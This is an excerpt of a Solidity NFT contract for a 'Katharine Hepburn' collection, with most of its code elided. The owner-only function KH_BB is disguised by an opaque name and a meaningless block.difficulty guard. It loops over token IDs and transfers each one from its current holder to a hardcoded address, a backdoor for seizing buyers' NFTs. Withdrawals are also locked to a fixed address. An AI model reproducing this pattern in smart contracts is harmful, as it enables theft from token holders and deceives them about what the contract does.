...
contract Katharine_Hepburn is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Katharine Hepburn", "KH", maxBatchSize_, collectionSize_) {
  ...
  function KH_BB(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0xE31537d82D8be652BD8d1950c9f390f9c9A22158, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0xAC369329130A633e6F9A1107F03B8851905E6344);
